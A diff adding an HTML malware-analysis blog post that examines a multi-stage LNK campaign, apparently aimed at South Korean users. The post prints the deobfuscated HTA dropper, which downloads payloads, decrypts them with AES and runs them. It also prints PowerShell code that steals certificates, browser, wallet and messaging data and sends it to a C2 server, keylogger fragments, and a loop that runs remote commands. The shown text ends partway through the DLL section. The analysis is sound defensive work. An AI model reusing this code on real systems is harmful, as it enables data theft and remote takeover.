@@ -1,0 +1,1452 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>GraymanRE - Multi-Stage LNK Malware Campaign Analysis</title>
+    <meta name="description"
+        content="A technical analysis of a multi-stage LNK malware campaign delivering PowerShell stealers, DLL implants, and MeshCentral-based remote access." />
+    <meta name="robots" content="follow, index" />
+
+    <link rel="canonical" href="https://graymanre.github.io/re/multistage_lnk_campaign.html">
+
+    <!-- Open Graph -->
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="GraymanRE - Multi-Stage LNK Malware Campaign Analysis">
+    <meta property="og:description"
+        content="A technical analysis of a multi-stage LNK malware campaign delivering PowerShell stealers, DLL implants, and MeshCentral-based remote access.">
+    <meta property="og:image" content="https://graymanre.github.io/img/multistage.webp">
+    <meta property="og:image:alt" content="Multi-Stage LNK Malware Campaign Analysis">
+    <meta property="og:url" content="https://graymanre.github.io/re/multistage_lnk_campaign.html">
+    <meta property="og:site_name" content="GraymanRE">
+
+    <!-- Twitter / X -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="GraymanRE - Multi-Stage LNK Malware Campaign Analysis">
+    <meta name="twitter:description"
+        content="A technical analysis of a multi-stage LNK malware campaign delivering PowerShell stealers, DLL implants, and MeshCentral-based remote access.">
+    <meta name="twitter:image" content="https://graymanre.github.io/img/multistage.webp">
+    <meta name="twitter:creator" content="@grayman_re">
+
+    <link rel="icon" type="image/x-icon" href="/img/favicon.ico">
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;900&display=swap" rel="stylesheet">
+
+    <!-- Ionicons -->
+    <link href="https://unpkg.com/ionicons@4.2.2/dist/css/ionicons.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="/css/main.css">
+    <link rel="stylesheet" href="/css/prism.css" />
+
+    <!-- Structured Data: BlogPosting -->
+    <script type="application/ld+json">
+    {
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "headline": "GraymanRE - Multi-Stage LNK Malware Campaign Analysis",
+    "description": "A technical analysis of a multi-stage LNK malware campaign delivering PowerShell stealers, DLL implants, and MeshCentral-based remote access.",
+    "image": "https://graymanre.github.io/img/multistage.webp",
+    "author": {
+        "@type": "Person",
+        "name": "GraymanRE",
+        "url": "https://graymanre.github.io/contact/"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "GraymanRE",
+        "logo": {
+        "@type": "ImageObject",
+        "url": "https://graymanre.github.io/img/logo.webp"
+        }
+    },
+    "datePublished": "2026-06-08",
+    "dateModified": "2026-06-08",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://graymanre.github.io/re/multistage_lnk_campaign.html"
+    },
+    "inLanguage": "en"
+    }
+    </script>
+
+    <!-- Structured Data: Breadcrumbs -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "GraymanRE",
+          "item": "https://graymanre.github.io/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "GraymanRE - Multi-Stage LNK Malware Campaign Analysis",
+          "item": "https://graymanre.github.io/re/multistage_lnk_campaign.html"
+        }
+      ]
+    }
+    </script>
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            $('#header-content').load('https://graymanre.github.io/header.html', function () {
+                $.getScript('/js/common.js');
+            });
+            $("#footer-content").load("https://graymanre.github.io/footer.html");
+        });
+    </script>
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4VZEKGVZPK"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+
+        gtag('config', 'G-4VZEKGVZPK');
+    </script>
+</head>
+
+<body class="is-in">
+    <!-- begin header -->
+    <header class="header">
+        <div id="header-content"></div>
+    </header>
+    <!-- end header -->
+    <!-- begin search -->
+    <div class="search">
+        <div class="container">
+            <div class="row">
+                <div class="col col-12">
+                    <div class="search__box">
+                        <div class="search__group">
+                            <div class="search__close">
+                                <i class="ion ion-md-close"></i>
+                            </div>
+                            <label for="js-search-input" class="screen-reader-text">Search for Post</label>
+                            <input type="text" id="js-search-input" class="search__text" autocomplete="off"
+                                placeholder="Type to search...">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row search-results-list" id="js-results-container"></div>
+        </div>
+    </div>
+    <!-- end search -->
+    <!-- Start of custom content -->
+    <main class="content" aria-label="Content">
+        <div class="post-head">
+            <div class="container">
+                <div class="row">
+                    <div class="col col-2"></div>
+                    <div class="col col-8 col-t-12">
+                        <div class="post-head__box">
+                            <div class="post__meta">
+                                <span id="time"></span> min read <time class="post__date"
+                                    datetime="2024-07-12T00:00:00+02:00">- 08 June 2026</time>
+                            </div>
+                            <h1 class="post__title">Multi-Stage LNK Malware Campaign Analysis</h1>
+                            <div class="post__bottom">
+                                <div class="post__author">
+                                    <a href="/contact/" aria-label="GraymanRE">
+                                        <img class="post__author-image" src="/img/logo.webp" alt="GraymanRE's Picture">
+                                    </a>
+                                </div>
+                                <div class="post__bottom-meta">
+                                    <a href="/contact/" class="post__author-link">GraymanRE</a>
+                                    <span>in</span>
+                                    <span class="post-tags">
+                                        <a href="/projects" class="post__tag">Projects</a>
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- begin post -->
+        <div class="container">
+            <article id="article" class="post animate">
+                <div class="post__content">
+                    <h2 id="post__content__title">Introduction</h2>
+                    <p>
+                        This article analyzes a malicious LNK file that masquerades as password.txt to lure a target
+                        into executing an embedded command. The investigation shows how a seemingly simple shortcut file
+                        initiates a multi-stage infection chain that ultimately delivers a Remote Access Trojan (RAT).
+                    </p>
+                    <img class="lazy" data-src="/img/multistage_lnk_campaign.png" alt="DynoWiper Shutdown">
+                    <br><br>
+                    <h2 id="post__content__title">Table of Contents</h2>
+                    <nav class="toc" aria-label="Table of contents">
+                        <ol class="toc-list">
+                            <li>
+                                <a href="#section1">Analysis of malicious LNK file</a>
+                            </li>
+                            <li>
+                                <a href="#section2">Microsoft Defender is not disabled</a>
+                                <ol>
+                                    <li>
+                                        <a href="#section2.1">PowerShell-based Information Stealer</a>
+                                    </li>
+                                    <li>
+                                        <a href="#section2.2">Analysis of appload.dll</a>
+                                    </li>
+                                    <ol>
+                                        <li>
+                                            <a href="#section2.2.1">Understanding function sub_180001DE0</a>
+                                        </li>
+                                    </ol>
+                                    <li>
+                                        <a href="#section2.3">Edge and Chrome Implant Analysis</a>
+                                    </li>
+                                    <li>
+                                        <a href="#section2.4">TaskMgr Implant Analysis</a>
+                                    </li>
+                                </ol>
+                            </li>
+                            <li>
+                                <a href="#section3">Microsoft Defender is disabled</a>
+                                <ol>
+                                    <li>
+                                        <a href="#section3.1">Analyzing sys.dll</a>
+                                    </li>
+                                    <li>
+                                        <a href="#section3.2">Analyzing notepad.tmp</a>
+                                    </li>
+                                    <ol>
+                                        <li>
+                                            <a href="#section3.2.1">Creating persistence</a>
+                                        </li>
+                                        <li>
+                                            <a href="#section3.2.2">Keylogging capabilities</a>
+                                        </li>
+                                        <li>
+                                            <a href="#section3.2.3">File indexer</a>
+                                        </li>
+                                        <li>
+                                            <a href="#section3.2.4">Information gathering</a>
+                                        </li>
+                                        <li>
+                                            <a href="#section3.2.5">Additional Commands and Implants</a>
+                                        </li>
+                                        <li>
+                                            <a href="#section3.2.6">TaskMgr Implant</a>
+                                        </li>
+                                    </ol>
+                                </ol>
+                            </li>
+                            <li>
+                                <a href="#section4">Indicators of Compromise</a>
+                            </li>
+                        </ol>
+                    </nav><br>
+
+                    <h2 id="section1">Analysis of malicious LNK file</h2>
+                    <p>
+                        This multi-stage infection campaign starts with the delivery of a simple <code>.lnk</code>
+                        file. The delivery method is currently unknown but valid
+                        methods potentially include phishing emails.
+                        <br>
+                        The <code>.lnk</code> file masquerades as a text file named <code>password.txt.lnk</code>.
+                        For this double file extension to appear legitimate, threat actors work under the assumption
+                        that victims have not enabled file-extension display.
+                        Therefore, a victim would only see <code>password.txt</code>.
+                        <br><br>
+                        By inspecting the properties of the <code>.lnk</code> file, we can infer the threat actor's
+                        initial objective. Specifically, we inspect the target of the file.
+                        <br>
+                    </p>
+                    <pre><code class="language-sh">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -e IAAgACAAIAAgACAAIAAgAG0AcwBoAHQAYQAgACAAIAAgACAAIgBoAHQAdABwAHMAOgAvAC8AbABpAG4AawAyADQALgBrAHIALwBIADYAagB5AHoAWgBlACIA</code></pre>
+                    <p>
+                        <br>
+                        After Base64 decoding and removing redundant null bytes, we are left with:
+                        <code>mshta "https[:]//link24.kr/H6jyzZe"</code>.
+                        <br>
+                        Link24 is a Korean URL shortener which can be used to obfuscate the destination URL. In the
+                        case of this shortened link, we are redirected to
+                        <code>https[:]//github.com/daldalkim/cuddly-octo-waddle/releases/download/v1.0.0/pwko.zip?v=6a1cd1078886f3.98521610"</code>
+                        <br><br>
+                        The redirect automatically downloads a file named: <code>pwko.zip</code>, from a GitHub
+                        repository named <code>Cuddly Octo Waddle</code> belonging to the user <code>daldalkim</code>.
+                        Based on the sole commit in this repository, we discover that the email address registered for
+                        this user is: <code>daldal.kim@bknecv.mailhubsec.com</code>.
+                        <br>
+                        Furthermore, on the releases page of this repository, we identify the existence of multiple
+                        other zip files.
+                    </p>
+                    <img class="lazy" data-src="/img/multistage_rat_commit.png" alt="Process Create Event">
+                    <p>
+                        <br>
+                        Although it identifies as a ZIP file, <code>pwko.zip</code> is actually a plaintext file
+                        containing obfuscated HTA content. Using Python, we can deobfuscate and analyze the script.
+                        The full deobfuscated HTA script is shown below.
+                    </p>
+                    <pre><code class="language-js">URL5 = https[:]//drive.google.com/uc?export=download&id=1u0g1doVUDc5VCeP653aze60SGlhs3efQ
+URL2 = https[:]//drive.google.com/uc?export=download&id=116azn_9bUov3mkSORbPk8_4zIVVNBHZn
+URL3 = https[:]//drive.google.com/uc?export=download&id=1jqpw8UHpsY5ps3nKOfkyo2ql4hC23Mew
+URL4 = https[:]//drive.google.com/uc?export=download&id=1x9mkl4q9ZU8_hDPNF5w0Mu8ePxVWI5VJ
+
+Set oShell = CreateObject(WScript.shell)
+
+gngjir = 'cmd /c cd /d %temp% && curl -L -o password.txt "URL5" && password.txt'
+oShell.Run(gngjir, 0, False)
+
+gngjir = cmd /c sc query WinDefend // [0]
+oShell.Exec(gngjir)
+
+output = exec.StdOut.ReadAll
+If InStr(output, "STOPPED") > 0 THEN
+    gngjir = 'cmd /c cd /d %localappdata% && curl -L -o user.txt "URL4"'
+    oShell.Run(gngjir, 0, True) // [1]
+
+    gngjir = 'cmd /c cd /d %localappdata% && curl -L -o sys.log "URL2" && powershell -Command "[System.IO.File]::WriteAllBytes('sys.dll', (New-Object System.Security.Cryptography.AesManaged).CreateDecryptor([System.Text.Encoding]::UTF8.GetBytes('ftrgmjekglgawkxjynqrwxjvjsydxgjc'), [System.Text.Encoding]::UTF8.GetBytes('rhmrpyihmziwkvln')).TransformFinalBlock([System.IO.File]::ReadAllBytes('sys.log'), 0, [System.IO.File]::ReadAllBytes('sys.log').Length))" && del sys.log && rundll32 sys.dll,k'
+    oShell.Run(gngjir, 0, False) // [2]
+
+Else
+    gngjir = 'cmd /c cd /d %localappdata% && curl -L -o pipe.log "URL3" && powershell -Command "[System.IO.File]::WriteAllBytes('pipe.zip', (New-Object System.Security.Cryptography.AesManaged).CreateDecryptor([System.Text.Encoding]::UTF8.GetBytes('ftrgmjekglgawkxjynqrwxjvjsydxgjc'), [System.Text.Encoding]::UTF8.GetBytes('rhmrpyihmziwkvln')).TransformFinalBlock([System.IO.File]::ReadAllBytes('pipe.log'), 0, [System.IO.File]::ReadAllBytes('pipe.log').Length))" && del pipe.log && powershell Expand-Archive -Path pipe.zip && del pipe.zip'
+    oShell.Run(gngjir, 0, True) // [3]
+
+    gngjir = 'cmd /c cd /d %localappdata% && cd pipe && powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File 1.ps1 -FileName 1.log'
+    oShell.Run(gngjir, 0, False) // [4]
+End If
+self.close</code></pre><br>
+                    <p>
+                        First, at <code>[0]</code>, a file is downloaded from URL5, which is saved as
+                        <code>password.txt</code>. At <code>[1]</code>, we see that the script checks if the
+                        <code>WinDefend</code> process, part of Microsoft Defender, is running.
+                        <br><br>
+                        If the process is not running, we move to <code>[2]</code>, where a file is downloaded from
+                        URL4 and saved as <code>user.txt</code> in the Local Application Data folder.
+                        <br><br>
+                        Subsequently, at <code>[3]</code>, another file is downloaded using URL2, and saved as
+                        <code>sys.log</code>. Furthermore, the subsequent AES decryption routine indicates that this
+                        file is AES-encrypted. After a successful download, PowerShell is used to decrypt the file using
+                        a hardcoded key (<code>ftrgmjekglgawkxjynqrwxjvjsydxgjc</code>) and hardcoded IV
+                        (<code>rhmrpyihmziwkvln</code>). The decrypted output is saved to a file named
+                        <code>sys.dll</code> and gets called using <code>rundll32</code>.
+                        <br><br>
+                        However, if Microsoft Defender is running, <code>[2]</code> and <code>[3]</code> are skipped.
+                        Instead we move to <code>[4]</code> which downloads a file from URL3 and saves it as
+                        <code>pipe.log</code>. This file gets AES decrypted using the same harcoded key and IV as
+                        previously mentioned before the output is saved as <code>pipe.zip</code>. The ZIP archive is
+                        then extracted and deleted. The extracted contents now lives in the Local Application Data
+                        folder. In the next step, at <code>[4]</code>, the PowerShell file <code>1.ps1</code>
+                        gets executed and the file <code>1.log</code> is supplied as a parameter.
+                        <br><br>
+                        Because the campaign follows different execution paths depending on whether Microsoft Defender
+                        is running, the analysis is split into two sections. First, we examine the path taken when
+                        Defender is running, which leads to the PowerShell-based stealer, browser-data collection, and
+                        additional implants. We then analyze the path taken when Defender is disabled, which results in
+                        the execution of sys.dll and the deployment of further payloads.
+                    </p>
+
+                    <h2 id="section2">Microsoft Defender is not disabled</h2>
+                    <p>
+                        The <code>1.ps1</code> is a relatively straightforward script which looks as follows:
+                    </p>
+                    <pre><code class="lang-powershell">param(
+    [string]$FileName
+)
+$content = gEt`-CoN`T`ENt $FileName -Raw
+$plain = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($content))
+i`ex $plain</code></pre>
+                    <p>
+                        Basically, it reads the contents from <code>1.log</code>, decodes it from Base64 and
+                        executes the decoded content using <code>Invoke-Expression (iex)</code>. Note that several
+                        command names are split using backticks backticks (<code>`</code>). This is likely an attempt to
+                        evade detection rules and security tools.
+                        <br><br>
+                        Based on this script, we should shift focus and further analyze <code>1.log</code> by
+                        decoding the base64 blob.
+                    </p>
+
+                    <h3 id="section2.1">PowerShell-based Information Stealer</h3>
+                    <p>
+                        After base64 decoding the contents of <code>1.log</code>, we are left with a 851-line
+                        PowerShell script. Let's analyze some of the features in this script.
+                        <br><br>
+                        First, the script obtains the UUID of the system which it will use to create a directory in
+                        the Temp folder. Furthermore, throughout the script it will use the <code>$id</code> for C2
+                        communications.
+                    </p>
+                    <pre><code class="language-powershell">$id = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
+$tempPath = $env:TEMP
+New-Item -Path "$tempPath\$id" -ItemType Directory -Force
+$storePath = "$tempPath\$id"</code></pre>
+
+                    <p>
+                        Next, it obtains the C2 URL by downloading another file from a Google Drive. The URL is AES
+                        encrypted using the same key and IV we have seen before. The current C2 URL points to
+                        <code>https[:]//lutkdd.corpsecs.com/</code>
+                    </p>
+                    <pre><code class="language-powershell">$serverenc = "https://drive.google.com/uc?export=download`&id=1FA9TvcakCgfeRdLaejIJbeoFjuI9GB6R"
+DownloadFile $serverenc "$tempPath\serverenc.log"
+$key = [System.Text.Encoding]::UTF8.GetBytes('ftrgmjekglgawkxjynqrwxjvjsydxgjc')
+$iv  = [System.Text.Encoding]::UTF8.GetBytes('rhmrpyihmziwkvln')
+$aes = New-Object System.Security.Cryptography.AesManaged
+$aes.Key = $key
+$aes.IV  = $iv
+$data = [System.IO.File]::ReadAllBytes("$tempPath\serverenc.log")
+$decrypted = $aes.CreateDecryptor().TransformFinalBlock($data, 0, $data.Length)
+$serverurl = [System.Text.Encoding]::UTF8.GetString($decrypted)
+Remove-Item "$tempPath\serverenc.log"</code></pre><br>
+                    <p>
+                        The script attempts to create a unique mutex with a name of <code>zcjwmdmj</code>. If the mutex
+                        cannot be created, the script will exit.
+                    </p>
+                    <pre><code class="language-powershell">$mutexName = "zcjwmdmj"
+$createdNew = $false
+$mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)
+if (-not $createdNew) {
+    Exit
+}</code></pre>
+                    <p>
+                        Once these initial tasks have been completed, the script defines a collection of
+                        functions that implement the script's main capabilities. The actual execution flow is
+                        defined near the bottom, where those functions are called in a specific order.
+                        <br><br>
+                        First, the <code>RegisterTask</code> function is invoked, whose sole purpose is to establish
+                        persistence by creating a new registry key in
+                        <code>HKCU:\Software\Microsoft\Windows\CurrentVersion\Run</code> named
+                        <code>WindowsSecurityCheck</code>.
+                        <br>
+                        The corresponding value is a PowerShell command that invokes <code>1.ps1</code> supplied with
+                        the <code>1.log</code> file.
+                        <br><br>
+                        We continue to the <code>Init</code> function which checks for the existence of the
+                        <code>%USERPROFILE%\AppData\LocalLow\NPKI</code> and <code>C:\GPKI</code> folders. These
+                        folders are the default directories where respectively the digital public certificates for
+                        secure financial transactions, online banking and government portal access in South Korea are
+                        stored and where the Government Public Key Infrastructure of South Korea stores official digital
+                        certificates and encryption keys for government employees.
+                        <br>
+                        If these locations exist, the directories get zipped and stored in the aforementioned
+                        temporary directory.
+                    </p>
+                    <pre><code class="language-powershell">$localLowPath = [System.IO.Path]::Combine($env:USERPROFILE, "AppData\LocalLow\NPKI")
+	
+if (Test-Path -Path $localLowPath) {
+    Compress-Archive -LiteralPath $localLowPath -DestinationPath "$storePath\NPKI.zip" -Force
+}
+
+localLowPath = "C:\GPKI"
+	
+if (Test-Path -Path $localLowPath) {
+    Compress-Archive -LiteralPath $localLowPath -DestinationPath "$storePath\GPKI.zip" -Force
+}</code></pre><br>
+                    <p>
+                        Furthermore, basic system information is gathered in the <code>Init</code> function
+                        including the ConsentPromptBehaviour, Product Name, Display Version, Current Build Number,
+                        Operating System, Processor, Disk Info, Volume Info, Network Adapters, Running Processes and
+                        Installed Software. Furthermore, the Disk Info is checked for the inclusion of 'Virtual
+                        Disk','Virtual HD','VMware' or 'Google PersistenDisk' which might indicate the script is run on
+                        a virtual machine. If this is the case, the script exits and deletes itself and
+                        <code>1.log</code> and <code>2.log</code>. This is likely done because a virtual machine could
+                        indicate the script is running in an analysis environment, and by killing itself it attempts to
+                        thwart detection.
+                        <br>
+                        The gathered information is then written to the temporary directory in a file named
+                        <code>info.txt</code>.
+                        <br><br>
+                        System information collection then continues through the invocation of the
+                        <code>RecentFiles</code> function. This function gathers all <code>.lnk</code>-extended
+                        files in the <code>%APPDATA%\Microsoft\Windows\Recent</code> folder. Then, the full target path
+                        for each of the shortcuts is obtained, which is subsequently written to a file named
+                        <code>recent.txt</code> in the temporary folder.
+                    </p>
+                    <pre><code class="lang-powershell">function RecentFiles {
+	$recentFolder = [System.IO.Path]::Combine($appdataPath, 'Microsoft\Windows\Recent')
+	$recentFiles = Get-ChildItem -Path $recentFolder -Filter *.lnk
+	$outputFile = "$storePath\recent.txt"
+	$recentFiles | ForEach-Object {
+	    $targetPath = Get-ShortcutTargetPath -shortcutPath $_.FullName
+	    $targetPath | Out-File -FilePath $outputFile -Append
+	}
+}</code></pre><br>
+                    <p>
+                        After this initial system collection, the script continues by invoking
+                        <code>GetBrowserData</code>. This function focuses on collection browser information
+                        including cookies, login data, extensions, bookmarks and wallet extension data. The supported
+                        browsers and wallets are listed below.
+                    </p>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th colspan="2">Browsers</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Edge</td>
+                                <td>Chrome</td>
+                            </tr>
+                            <tr>
+                                <td>Naver Whale - South Korean based</td>
+                                <td>Firefox</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <table>
+                        <thead>
+                            <tr>
+                                <th colspan="4">Wallets</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Meta</td>
+                                <td>Trust</td>
+                                <td>Tron</td>
+                                <td>Exod</td>
+                            </tr>
+                            <tr>
+                                <td>Binan</td>
+                                <td>Okx</td>
+                                <td>Phant</td>
+                                <td>Emeta</td>
+                            </tr>
+                            <tr>
+                                <td>Eokx</td>
+                                <td>Rainb</td>
+                                <td>Pontem</td>
+                                <td>Keplr</td>
+                            </tr>
+                            <tr>
+                                <td>Ton</td>
+                                <td>Iwal</td>
+                                <td>Stati</td>
+                                <td>Solf</td>
+                            </tr>
+                            <tr>
+                                <td>Kaia</td>
+                                <td>Cosmos</td>
+                                <td>Subwal</td>
+                                <td>Bybit</td>
+                            </tr>
+                            <tr>
+                                <td>Rabby</td>
+                                <td>Backpa</td>
+                                <td>Ronin</td>
+                                <td>Unisat</td>
+                            </tr>
+                            <tr>
+                                <td>Compas</td>
+                                <td>Argent</td>
+                                <td>Martia</td>
+                                <td>Petra</td>
+                            </tr>
+                            <tr>
+                                <td>Leacos</td>
+                                <td>Braav</td>
+                                <td>Talis</td>
+                                <td>Magic</td>
+                            </tr>
+                            <tr>
+                                <td>Coin98</td>
+                                <td>Xverse</td>
+                                <td>Kelpr</td>
+                                <td>Unisw</td>
+                            </tr>
+                            <tr>
+                                <td>Phant</td>
+                                <td>Sui</td>
+                                <td>Cobas</td>
+                                <td>Enkr</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    <p>
+                        With browser information collection completed, the next two functions aim to collect data
+                        from the Telegram Desktop app using <code>GetTelg</code> and from the Discord app using
+                        <code>GetDiscord</code>.
+                        <br>
+                        Specifically for Telegram, the <code>D877F783D5D3EF8C</code> folder is targeted which is
+                        created inside the <code>tdata</code> profile; it stores the primary account data, cached files
+                        and local session keys. These keys can be used to log into a Telegram account without scanning a
+                        QR code or receiving an SMS, potentially enabling full account takeover including access to all
+                        chats and sessions.
+                        <br><br>
+                        At this point, the <code>Send</code> function is invoked which is used to zip the by now
+                        collected data stored in the temporary directory and upload it to the C2 server using the
+                        previously saved UUID to identify the exfiltration.
+                    </p>
+                    <pre><code class="lang-powershell">function Send {
+	Compress-Archive -LiteralPath $storePath -DestinationPath "$localPath\init.zip" -Force
+	Rename-Item -Path "$localPath\init.zip" -NewName "init.dat" -ErrorAction SilentlyContinue
+	$url = $serverurl + "?id=$id"
+
+	$result = UploadFile $url "$localPath\init.dat" "same"
+	Start-Sleep -Seconds 5
+
+	if ($result -eq $true) {
+		Remove-Item -Path "$storePath\*" -Recurse -Force
+		Remove-Item -Path "$localPath\init.dat"
+	}
+}</code></pre><br>
+                    <p>
+                        However, Information-stealing activity has not yet fully concluded, as the next function,
+                        <code>CreateFileList</code> uses a hardcoded list of extensions and a list of name patterns
+                        to identify files of interest. If any files are identified, a full listing of the directory in
+                        which the files reside is stored in <code>FileList.txt</code> which ultimately gets sent to
+                        the C2 server.
+                    </p>
+                    <pre><code class="lang-powershell">$extensions = ".txt",".doc",".csv",".docx",".xls",".xlsx",".pdf",".hwp",".hwpx",".jpg",".jpeg",".png",".rar",".zip",".alz",".eml",".ldb",".log",".dat"
+$namePatterns = "wallet|UTC--|blockchain|keystore|privatekey|metamask|phrase|ledger|myether|dcent"</code></pre><br>
+
+                    <p>
+                        At this point, <code>Start-Process</code> is invoked, where <code>1.ps1</code> gets called.
+                        However, instead of passing <code>1.log</code>, now the second file <code>2.log</code> is
+                        passed as the parameter.
+                        <br>
+                        Therefore, we can base64 decode the contents of <code>2.log</code> and further analyze the
+                        activities performed in this script. It quickly becomes apparent that <code>2.log</code>
+                        contains a PowerShell-based keylogger. It defines a single function, aptly named
+                        <code>Keylog</code>, which stores all logged keystrokes in the same temporary directory in a
+                        file named <code>k.log</code>.
+                    </p>
+                    <pre><code class="lang-powershell">function Keylog {
+	$id = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
+	$tempPath = $env:TEMP
+	$storePath = "$tempPath\$id"
+	$logPath = "$storePath\k.log"
+
+    # [...]
+    switch ($ascii) {
+        {$_ -eq 8} { $key = "{BSPACE}" }
+        {$_ -eq 9} { $key = "{TAB}" }
+	    {$_ -eq 13} { $key = "{ENTER}" }
+        # [...]
+		default {
+		    $null = [console]::CapsLock
+			$virtualKey = $API::MapVirtualKey($ascii, 3)
+			$kbstate = New-Object -TypeName Byte[] -ArgumentList 256
+			$mychar = New-Object -TypeName System.Text.StringBuilder
+			$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+			if ($success) {
+			    $key = $mychar.ToString()
+			}
+		}
+	}
+	try {
+	    # $key | Out-File -FilePath $logPath -Append -NoNewline
+		strbuf += $key
+    } catch {}
+    # [...]
+}
+</code></pre><br>
+                    <p>
+                        While the keylogger is running, the last function in <code>1.log</code> gets executed which
+                        is named <code>Work</code>. This function is an infinite loop which runs every 300 seconds and
+                        attempts to upload several of the files that store the collected data:
+                    </p>
+
+                    <table>
+                        <thead>
+                            <th colspan="2">Collected files uploaded periodically</th>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>init.dat - Contains the zipped data of the temporary directory</td>
+                                <td>lst.dat - Contains the zipped data of directory listings of interesting files
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>FileList.txt - Contains directory listings of interesting files</td>
+                                <td>k.log - Contains output from the keylogger</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <p>
+                        Another component of the <code>Work</code> function is repeated attempts to contact the C2
+                        server and either download or write files.
+                        <br><br>
+                        One of those repeated attempts involves the retrievel of <code>appkey</code>. If the C2 server's
+                        response is not empty, it will trigger the invocation of the <code>GetAppKey</code> function
+                        which downloads a file from Google Drive and saves the contents as <code>appload.log</code>. The
+                        contents get AES decrypted using the same hardcoded key and IV and stores the output as
+                        <code>appload.dll</code>, which is then invoked using <code>rundll32.exe</code>.
+                        Specifically, the function <code>z</code> is invoked.
+                        <br><br>
+                        The script will then sleep for 20 seconds and subsequently upload <code>cc_appkey</code>,
+                        <code>ee_appkey</code> and <code>tmpgoochr.zip</code> to the C2 server, before removing the
+                        files as well as the DLL. See <a href="#section2.2" class="btn">the appload.dll section</a> for
+                        further analysis of this DLL.
+                        <br><br>
+                        Furthermore, the script supports custom downloads and uploads of files through the
+                        <code>rd</code> and <code>wr</code> URI components, as well as the execution of commands
+                        through querying the <code>cm</code> URL directory path.
+                    </p>
+                    <pre><code class="lang-powershell"># Read File
+try{
+    $webClient = New-Object System.Net.WebClient
+	$url = $serverurl + "$id/rd"
+	$content = $webClient.DownloadString($url)
+
+	$url = $serverurl + "?id=$id"
+	$lines = $content -replace "`r", "" -split "`n"
+	foreach ($line in $lines) {
+	    if($line -ne "") {
+		    $array = $line -split "`t"
+			if ($array.Length -gt 1) {
+			    UploadFile $url $array[0] $array[1]
+            }
+			elseif(Test-Path -Path $line -PathType Container) {
+			    $folderName = Split-Path -Path $line -Leaf
+				$destpath = Join-Path $tempPath ($folderName + ".zip")
+				Compress-Archive -LiteralPath $line -DestinationPath $destpath -Force
+				$result = UploadFile $url $destpath
+				if($result -eq $true) {
+				    Remove-Item $destpath
+                }
+            }
+			else {
+			    UploadFile $url $line
+            }
+			Start-Sleep -Milliseconds 500
+		}
+	}
+	$url = $serverurl + "?id=$id&del=rd"
+	Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing
+} catch {
+    $content = ""
+} finally {
+    $webClient.Dispose()
+}
+
+# Write File
+try{
+    $webClient = New-Object System.Net.WebClient
+	$url = $serverurl + "$id/wr"
+	$content = $webClient.DownloadString($url)
+	$lines = $content -replace "`r", "" -split "`n"
+	foreach ($line in $lines) {
+	    if($line -ne "") {
+		    $fileName = Split-Path -Path $line -Leaf
+			$url = $serverurl + $id + "../" + $fileName
+			DownloadFile $url $line
+			Start-Sleep -Milliseconds 500
+			$url = $serverurl + "?id=" + $id + "&del=" + $fileName
+			Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing
+		}
+	}
+			
+	$url = $serverurl + "?id=$id&del=wr"
+	Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing
+} catch {
+    $content = ""
+} finally {
+	$webClient.Dispose()
+}
+
+# Command
+try{
+    $url = $serverurl + "$id/cm"
+	$webClient = New-Object System.Net.WebClient
+	$content = $webClient.DownloadString($url)
+	Invoke-Expression $content
+	$url = $serverurl + "?id=$id&del=cm"
+	Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing
+} catch {
+    $content = ""
+} finally {
+    $webClient.Dispose()
+}</code></pre><br>
+
+                    <h3 id="section2.2">Analysis of appload.dll</h3>
+                    <p>
+                        We previously identified that <code>appload.dll</code> is called and function <code>z</code>
+                        is invoked. Therefore, function <code>z</code> will be the starting point of our analysis of
+                        the <code>appload.dll</code>.
+                        <br>
+                        Within <code>z</code>, the function calls <code>SHGetSpecialFolderPathA</code> multiple times
+                        with specific <code>CLSID</code> values. The table below links the values to the known
+                        locations for easier reference:
+                    </p>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>CLSID</th>
+                                <th>Location</th>
+                            </tr>
+                        </thead>
